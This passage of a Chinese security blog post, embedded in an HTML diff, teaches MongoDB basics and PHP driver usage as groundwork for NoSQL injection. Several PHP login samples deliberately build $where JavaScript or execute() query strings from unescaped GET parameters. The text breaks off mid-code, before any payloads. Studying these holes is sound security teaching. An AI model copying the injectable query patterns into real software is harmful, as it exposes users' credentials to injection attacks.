@@ -1,0 +1,923 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="MongoDB 作为 nosql 中比较有代表性的，我把它当做学习 nosql 注入的代表数据库。同样，利用对比的方式快速迁移 MySQL 注入的知识。">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+  <title>MongoDB 注入指北 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/monokai-sublime.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"丨","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Tr0y's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                lifeline
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                gallery
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/page.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="MongoDB 注入指北">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-04-21 15:14" pubdate>
+        星期日, 四月 21日 2019, 3:14 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      53
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">MongoDB 注入指北</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：星期二, 十一月 10日 2020, 3:13 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>MongoDB 作为 nosql 中比较有代表性的，我把它当做学习 nosql 注入的代表数据库。同样，利用对比的方式快速迁移 MySQL 注入的知识。</p>
+<span id="more"></span>
+<h2 id="MongoDB-极速入门"><a href="#MongoDB-极速入门" class="headerlink" title="MongoDB 极速入门"></a>MongoDB 极速入门</h2><p>建议先看菜鸟教程 <a target="_blank" rel="noopener" href="http://www.runoob.com/mongodb/mongodb-tutorial.html">传送门🚪</a></p>
+<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><code>MySQL</code>：<code>MongoDB</code></p>
+<ul>
+<li>数据库：数据库</li>
+<li>表：集合</li>
+<li>数据：文档</li>
+</ul>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>由于 MongoDB 的语法与常见的 RDBMS 数据库差距较大，所以不打算一一进行对比。</p>
+<p>归纳一下常用的语法：</p>
+<ul>
+<li>创建数据库：<code>use DATABASE_NAME</code>，数据库不存在，则创建数据库，否则切换到指定数据库。</li>
+<li>查看所有数据库： <code>show dbs</code>、<code>db.getCollectionNames()</code></li>
+<li>版本：<code>db.version()</code></li>
+<li>删除数据库：<code>db.dropDatabase()</code></li>
+<li>查看当前数据库：<code>db</code>、<code>db.getName()</code></li>
+<li>插入：<code>db.COLLECTION_NAME.insert(document)</code></li>
+<li>查询：<code>db.COLLECTION_NAME.find(query, projection)</code></li>
+<li>比较语句：<br><img src="/MongoDB注入指北/20190425071803243.png" srcset="/img/loading.gif" lazyload alt=""></li>
+<li>OR：MongoDB <code>OR</code> 条件语句使用了关键字 <code>$or</code>。<figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">db</span><span class="hljs-selector-class">.COLLECTION_NAME</span><span class="hljs-selector-class">.find</span>(<br>   &#123;<br>      $or: [<br>         &#123;key1: value1&#125;, &#123;key2:value2&#125;<br>      ]<br>   &#125;<br>)<span class="hljs-selector-class">.pretty</span>()<br></code></pre></div></td></tr></table></figure></li>
+<li>AND：MongoDB 的 <code>find()</code> 可以传入多个键(key)，每个键(key)以<code>,</code>隔开，即 SQL 的 <code>AND</code> 条件。<code>db.COLLECTION_NAME.find(&#123;key1: value1, key2: value2&#125;)</code>。当然 MongoDB 也有<code>$and</code>，所以 <code>and</code>也可以和<code>or</code>一样用。</li>
+<li>limit：<code>db.COLLECTION_NAME.find().limit(NUMBER)</code></li>
+<li>skip：<code>skip()</code> 方法为跳过指定数量的数据。接受一个数字参数作为跳过的记录条数。<code>db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)</code></li>
+<li>注释：<code>//</code></li>
+<li>转为 json：<code>tojson()</code></li>
+<li>所有 <code>db</code>的方法：<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">&gt; <span class="hljs-keyword">db</span>.<br><span class="hljs-keyword">db</span>.adminCommand(               <span class="hljs-keyword">db</span>.getName(                    <span class="hljs-keyword">db</span>.printSlaveReplicationInfo(<br><span class="hljs-keyword">db</span>.aggregate(                  <span class="hljs-keyword">db</span>.getPrevError(               <span class="hljs-keyword">db</span>.propertyIsEnumerable<br><span class="hljs-keyword">db</span>.auth(                       <span class="hljs-keyword">db</span>.getProfilingLevel(          <span class="hljs-keyword">db</span>.prototype<br><span class="hljs-keyword">db</span>.changeUserPassword(         <span class="hljs-keyword">db</span>.getProfilingStatus(         <span class="hljs-keyword">db</span>.removeUser(<br><span class="hljs-keyword">db</span>.cloneCollection(            <span class="hljs-keyword">db</span>.getQueryOptions(            <span class="hljs-keyword">db</span>.repairDatabase(<br><span class="hljs-keyword">db</span>.cloneDatabase(              <span class="hljs-keyword">db</span>.getReplicationInfo(         <span class="hljs-keyword">db</span>.resetError(<br><span class="hljs-keyword">db</span>.commandHelp(                <span class="hljs-keyword">db</span>.getRole(                    <span class="hljs-keyword">db</span>.revokePrivilegesFromRole(<br><span class="hljs-keyword">db</span>.constructor                 <span class="hljs-keyword">db</span>.getRoles(                   <span class="hljs-keyword">db</span>.revokeRolesFromRole(<br><span class="hljs-keyword">db</span>.copyDatabase(               <span class="hljs-keyword">db</span>.getSession(                 <span class="hljs-keyword">db</span>.revokeRolesFromUser(<br><span class="hljs-keyword">db</span>.createCollection(           <span class="hljs-keyword">db</span>.getSiblingDB(               <span class="hljs-keyword">db</span>.runCommand(<br><span class="hljs-keyword">db</span>.createRole(                 <span class="hljs-keyword">db</span>.getSisterDB(                <span class="hljs-keyword">db</span>.runCommandWithMetadata(<br><span class="hljs-keyword">db</span>.createUser(                 <span class="hljs-keyword">db</span>.getSlaveOk(                 <span class="hljs-keyword">db</span>.runReadCommand(<br><span class="hljs-keyword">db</span>.createView(                 <span class="hljs-keyword">db</span>.getUser(                    <span class="hljs-keyword">db</span>.serverBits(<br><span class="hljs-keyword">db</span>.currentOP(                  <span class="hljs-keyword">db</span>.getUsers(                   <span class="hljs-keyword">db</span>.serverBuildInfo(<br><span class="hljs-keyword">db</span>.currentOp(                  <span class="hljs-keyword">db</span>.getWriteConcern(            <span class="hljs-keyword">db</span>.serverCmdLineOpts(<br><span class="hljs-keyword">db</span>.dbEval(                     <span class="hljs-keyword">db</span>.grantPrivilegesToRole(      <span class="hljs-keyword">db</span>.serverStatus(<br><span class="hljs-keyword">db</span>.dropAllRoles(               <span class="hljs-keyword">db</span>.grantRolesToRole(           <span class="hljs-keyword">db</span>.setLogLevel(<br><span class="hljs-keyword">db</span>.dropAllUsers(               <span class="hljs-keyword">db</span>.grantRolesToUser(           <span class="hljs-keyword">db</span>.setProfilingLevel(<br><span class="hljs-keyword">db</span>.dropDatabase(               <span class="hljs-keyword">db</span>.<span class="hljs-built_in">group</span>(                      <span class="hljs-keyword">db</span>.setSlaveOk(<br><span class="hljs-keyword">db</span>.dropRole(                   <span class="hljs-keyword">db</span>.groupcmd(                   <span class="hljs-keyword">db</span>.setWriteConcern(<br><span class="hljs-keyword">db</span>.dropUser(                   <span class="hljs-keyword">db</span>.groupeval(                  <span class="hljs-keyword">db</span>.shutdownServer(<br><span class="hljs-keyword">db</span>.eval(                       <span class="hljs-keyword">db</span>.hasOwnProperty              <span class="hljs-keyword">db</span>.stats(<br><span class="hljs-keyword">db</span>.forceError(                 <span class="hljs-keyword">db</span>.<span class="hljs-keyword">help</span>(                       <span class="hljs-keyword">db</span>.system.profile<br><span class="hljs-keyword">db</span>.fsyncLock(                  <span class="hljs-keyword">db</span>.hostInfo(                   <span class="hljs-keyword">db</span>.toLocaleString<br><span class="hljs-keyword">db</span>.fsyncUnlock(                <span class="hljs-keyword">db</span>.isMaster(                   <span class="hljs-keyword">db</span>.<span class="hljs-keyword">toString</span>(<br><span class="hljs-keyword">db</span>.getCollection(              <span class="hljs-keyword">db</span>.killOP(                     <span class="hljs-keyword">db</span>.tojson(<br><span class="hljs-keyword">db</span>.getCollectionInfos(         <span class="hljs-keyword">db</span>.killOp(                     <span class="hljs-keyword">db</span>.unsetWriteConcern(<br><span class="hljs-keyword">db</span>.getCollectionNames(         <span class="hljs-keyword">db</span>.listCommands(               <span class="hljs-keyword">db</span>.updateRole(<br><span class="hljs-keyword">db</span>.getLastError(               <span class="hljs-keyword">db</span>.loadServerScripts(          <span class="hljs-keyword">db</span>.updateUser(<br><span class="hljs-keyword">db</span>.getLastErrorCmd(            <span class="hljs-keyword">db</span>.logout(                     <span class="hljs-keyword">db</span>.users<br><span class="hljs-keyword">db</span>.getLastErrorObj(            <span class="hljs-keyword">db</span>.printCollectionStats(       <span class="hljs-keyword">db</span>.valueOf(<br><span class="hljs-keyword">db</span>.getLogComponents(           <span class="hljs-keyword">db</span>.printReplicationInfo(       <span class="hljs-keyword">db</span>.<span class="hljs-keyword">version</span>(<br><span class="hljs-keyword">db</span>.getMongo(                   <span class="hljs-keyword">db</span>.printShardingStatus(<br></code></pre></div></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="PHP-联动"><a href="#PHP-联动" class="headerlink" title="PHP 联动"></a>PHP 联动</h3><p>其实什么语言是没有太大区别的。我就以 PHP 为例。<br>由于版本的问题，适用于 PHP <code>5.x</code>以下和 <code>7.x</code>以上的 MongoDB Driver 还有新旧之分：旧版 3 种，新版 3 种，所以 PHP 与 MongoDB 联动有 6 种写法。</p>
+<p><strong>旧版写法一</strong></p>
+<blockquote>
+<p>用 <code>mongo</code> 类中相应的方法执行增查减改</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> mongoclient();<br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;myinfo; <span class="hljs-comment">//选择数据库</span><br><span class="hljs-variable">$coll</span> = <span class="hljs-variable">$db</span>-&gt;sec_test; <span class="hljs-comment">//选择集合</span><br><span class="hljs-variable">$uname</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$coll</span>-&gt;find(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uname&#x27;</span>=&gt;<span class="hljs-variable">$username</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>=&gt;<span class="hljs-variable">$pwd</span>));<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;count()&gt;<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;uname&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;该用户不存在&#x27;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>传递的参数是一个数组，比较安全。这种形式叫 <code>ODM</code>，它会帮你过滤数据，所以一般不用担心原语句被破坏。顺便提一下，<code>ORM</code> 对应关系型数据库，如 MySQL；<code>ODM</code> 对应文档型数据库，如 MongoDB。它们的区别就在与对应的数据库类型不同，查询的形式都是通过一个类操作数据库而不是自己处理数据库语句，例如：<code>$coll-&gt;find();</code>。</p>
+<p>但是 MongoDB 有个<code>$where</code>操作符是可以执行 JavaScript 语句的，可扩展性一下就变强了，于是有人会这样用：</p>
+<p><strong>旧版写法二</strong></p>
+<blockquote>
+<p>用 <code>$where</code> 操作符</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> mongoclient();<br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;myinfo; <span class="hljs-comment">//选择数据库</span><br><span class="hljs-variable">$coll</span> = <span class="hljs-variable">$db</span>-&gt;sec_test; <span class="hljs-comment">//选择集合</span><br><span class="hljs-variable">$uname</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$function</span> = <span class="hljs-string">&quot;function() &#123;if(this.uname == &#x27;<span class="hljs-subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="hljs-subst">$pwd</span>&#x27;) return true&#125;&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$coll</span>-&gt;find(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$where&#x27;</span>=&gt;<span class="hljs-variable">$function</span>));<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;count() &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;uname&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;该用户不存在&#x27;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p><strong>旧版写法三</strong></p>
+<blockquote>
+<p>用 <code>execute</code> 方法执行字符串</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> mongoclient();<br><span class="hljs-variable">$uname</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;sec_test; <span class="hljs-comment">// 选择数据库</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;db.users.find(&#123;&#x27;uname&#x27;: &quot;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&quot;&#125;,&#123;&#x27;pwd&#x27;, &quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#125;)&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;execute(<span class="hljs-variable">$query</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;count() &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;uname&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;该用户不存在&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+<p>传进 <code>execute</code> 的参数就是字符串。</p>
+<p><strong>新版写法一</strong><br>利用 <code>executeQuery</code> 直接进行查询：<br><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$manager</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Manager();<br><br><span class="hljs-variable">$uname</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;uname&#x27;</span>=&gt;<span class="hljs-variable">$uname</span>,<br>    <span class="hljs-string">&#x27;pwd&#x27;</span>=&gt;<span class="hljs-variable">$pwd</span><br>));<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;sec_test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br><br><span class="hljs-variable">$count</span> = count(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span>&gt;<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;<br>        <span class="hljs-variable">$user</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-variable">$user</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;uname&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;未找到&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></p>
+<p>与旧版写法一类似。</p>
+<p><strong>新版写法二</strong><br><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$manager</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Manager();<br><br><span class="hljs-variable">$uname</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-variable">$function</span> = <span class="hljs-string">&quot;function() &#123;if(this.uname == &#x27;<span class="hljs-subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="hljs-subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;<br><br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;$where&#x27;</span> =&gt; <span class="hljs-variable">$function</span><br>));<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span 